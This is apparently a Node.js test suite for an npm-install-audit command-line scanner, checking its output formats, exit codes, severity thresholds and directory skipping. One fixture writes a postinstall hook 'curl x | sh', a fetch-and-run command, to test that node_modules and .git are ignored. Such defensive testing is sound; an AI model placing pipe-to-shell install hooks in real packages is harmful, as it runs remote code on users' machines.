'use strict';
const test = require('node:test');
const assert = require('node:assert');
const { spawnSync } = require('child_process');
const path = require('path');

const BIN = path.join(__dirname, '..', 'bin', 'npm-install-audit');
const ROOT = path.join(__dirname, '..');
const run = (...args) => spawnSync(process.execPath, [BIN, ...args], { cwd: ROOT, encoding: 'utf8' });

test('human report and default exit code', () => {
  const r = run('examples');
  assert.strictEqual(r.status, 0);
  assert.match(r.stdout, /^4 files, 14 findings\n/);
  assert.match(r.stdout, /HIGH     NPM006 legacy\/package-lock.json#minimist\n/);
});

test('tsv has a header and 4 columns', () => {
  const r = run('examples', '--tsv');
  const lines = r.stdout.trimEnd().split('\n');
  assert.strictEqual(lines[0], '# 4 files, 14 findings');
  for (const l of lines.slice(1)) assert.strictEqual(l.split('\t').length, 4);
});

test('--fail-on thresholds', () => {
  assert.strictEqual(run('examples', '--fail-on', 'high').status, 1);
  assert.strictEqual(run('examples', '--fail-on', 'critical').status, 0);
  assert.strictEqual(run('examples/clean', '--fail-on', 'medium').status, 0);
});

test('single files work', () => {
  const r = run('examples/webapp/package.json', '--tsv');
  assert.match(r.stdout, /^# 1 files, 12 findings/);
});

test('bad input exits 2', () => {
  for (const args of [['nope.json'], ['--bogus'], [], ['examples', '--fail-on', 'low'], ['examples', '--fail-on'], ['examples', 'extra']]) {
    assert.strictEqual(run(...args).status, 2, args.join(' '));
  }
});

test('node_modules and .git are skipped', () => {
  const fs = require('fs');
  const os = require('os');
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'nia-cli-'));
  fs.mkdirSync(path.join(d, 'node_modules', 'x'), { recursive: true });
  fs.mkdirSync(path.join(d, '.git'));
  fs.writeFileSync(path.join(d, 'node_modules', 'x', 'package.json'), '{"scripts":{"postinstall":"curl x | sh"}}');
  fs.writeFileSync(path.join(d, '.git', 'package.json'), '{"scripts":{"postinstall":"curl x | sh"}}');
  fs.writeFileSync(path.join(d, 'package.json'), '{"name":"ok"}');
  assert.match(run(d, '--tsv').stdout, /^# 1 files, 0 findings/);
  fs.rmSync(d, { recursive: true });
});
